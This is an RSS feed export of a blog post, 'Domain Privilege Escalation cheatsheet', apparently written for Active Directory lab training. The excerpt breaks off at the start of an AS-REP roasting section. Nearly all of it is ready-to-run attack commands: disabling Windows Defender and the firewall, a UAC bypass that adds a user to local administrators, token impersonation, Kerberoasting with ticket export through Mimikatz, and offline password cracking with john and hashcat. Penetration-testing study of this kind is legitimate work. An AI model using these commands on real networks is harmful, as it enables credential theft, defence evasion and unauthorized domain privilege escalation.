<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cheatsheet | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/cheatsheet/</link><atom:link href="https://www.peco602.com/tag/cheatsheet/index.xml" rel="self" type="application/rss+xml"/><description>Cheatsheet</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 31 Jul 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Cheatsheet</title><link>https://www.peco602.com/tag/cheatsheet/</link></image><item><title>Domain Privilege Escalation cheatsheet</title><link>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</link><pubDate>Sun, 31 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</guid><description>&lt;h2 id="windows-defender">Windows Defender&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Windows Defender&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Firewall&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">allprofiles&lt;/span> &lt;span class="n">state&lt;/span> &lt;span class="n">off&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## powershell.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Profile&lt;/span> &lt;span class="n">Domain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Private&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="user-account-control-uac">User Account Control (UAC)&lt;/h2>
&lt;p>In case you are a member of the local administrators group, but you still have the &lt;em>Medium Mandatory Level&lt;/em> label, it is necessary to bypass the &lt;em>User Account Control (UAC)&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># FodhelperUACBypass.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">FodhelperUACBypass&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c powershell.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Alternatively, you can use &lt;a href="https://github.com/FatRodzianko/SharpBypassUAC" target="_blank" rel="noopener">SharpBypassUAC&lt;/a>.&lt;/p>
&lt;h2 id="token-manipulation">Token Manipulation&lt;/h2>
&lt;p>Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g.Â CobaltStrike to inject into said processes.&lt;/p>
&lt;h3 id="incognito">Incognito&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># A SYSTEM shell is required&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">PsExec64&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">list_tokens&lt;/span> &lt;span class="n">-u&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">system32&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">calc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="invoke-tokenmanipulation">Invoke-TokenManipulation&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ShowAll&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show only unique, usable tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-Enumerate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ImpersonateUser&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of another process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-CreateProcess&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\system32\calc.exe&amp;#34;&lt;/span> &lt;span class="n">-ProcessId&lt;/span> &lt;span class="mf">500&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="classic-kerberoasting">Classic Kerberoasting&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find user accounts used as Service accounts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a Ticket Granting Service (TGS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyName&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the TGS has been granted:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Export all tickets using Mimikatz&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">git&lt;/span> &lt;span class="n">clone&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">nidem&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">kerberoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">python3&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">tgsrepcrack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">py&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="mf">10&lt;/span>&lt;span class="n">-million-password-list-top&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1000000&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">240a10000-STUDENT1&lt;/span>&lt;span class="nv">@MSSQLSvc&lt;/span>&lt;span class="p">~&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">localCYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>An alternative way to perform Kerberoasting is to use &lt;code>PowerSploit&lt;/code> combined to &lt;code>john&lt;/code> or &lt;code>hashcat&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Find user accounts used as Service accounts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Kerberoast.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">john&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">hashcat&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Brute-force the exported ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>krb5tgs --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_tgs.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">13100&lt;/span> --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>hashcat&lt;/code> format can also be cracked by &lt;code>john&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="targeted-kerberoasting-set-spn">Targeted Kerberoasting (Set SPN)&lt;/h2>
&lt;p>With enough rights (&lt;em>GenericAll&lt;/em>/&lt;em>GenericWrite&lt;/em>), a target userâs SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be âKerberoastedâ.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Letâs enumerate the permissions for RDPUsers on ACLs&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># PowerView
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match &amp;#34;RDPUsers&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the user already has a SPN:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Set a SPN for the user (must be unique for the domain):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Set&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">serviceprincipalname&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-ServicePrincipalNames&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">Add&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyNAme&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;ops/whatever1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the ticket has been granted:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Export all tickets using Mimikatz:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">git clone https://github.com/nidem/kerberoast
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-student1@ops~whatever1CYBERLAB.CYBERCORP.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="asreproasting-as-rep">ASREProasting (AS-REP)&lt;/h2>
&lt;p>If a userâs &lt;em>UserAccountControl&lt;/em> settings have &lt;em>Do not require Kerberos preauthentication&lt;/em> enabled, i.e.Â Kerberos preauth is disabled, it is possible to grab userâs crackable AS-REP and brute-force it offline. With sufficient rights (&lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em>), Kerberos preauth can be forced disabled as well.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Enumerating accounts with Kerberos Preauth disabled:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
